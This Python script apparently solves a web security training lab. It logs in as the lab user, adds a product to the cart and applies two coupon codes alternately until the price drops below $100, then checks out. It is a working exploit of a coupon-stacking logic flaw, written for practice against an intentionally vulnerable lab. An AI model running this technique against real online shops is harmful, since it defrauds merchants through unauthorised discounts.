import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.email_client = None

    def get_csrf_token(self, path):
        response = self.session.get(self.lab_url + path)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def send_target_product_to_cart(self):
        data = {
            'productId': 1,
            'redir': 'PRODUCT',
            'quantity': 1
        }
        self.session.post(self.lab_url + 'cart', data=data)

    def apply_coupons(self):
        while True:
            response = self.session.get(self.lab_url + 'cart')
            total = float(re.findall(r'<th>\$(.*)</th>', response.text)[0])
            if total < 100.0:
                break
            else:
                data = {
                    'csrf': self.get_csrf_token('cart'),
                    'coupon': 'NEWCUST5'
                }
                self.session.post(self.lab_url + 'cart/coupon', data=data)
                data = {
                    'csrf': self.get_csrf_token('cart'),
                    'coupon': 'SIGNUP30'
                }
                self.session.post(self.lab_url + 'cart/coupon', data=data)

    def buy_target_product(self):
        data = {
            'csrf': self.get_csrf_token('cart')
        }
        self.session.post(self.lab_url + 'cart/checkout', data=data)
        self.session.get(self.lab_url + 'cart/order-confirmation?order-confirmed=true')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.send_target_product_to_cart()
        self.apply_coupons()
        self.buy_target_product()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
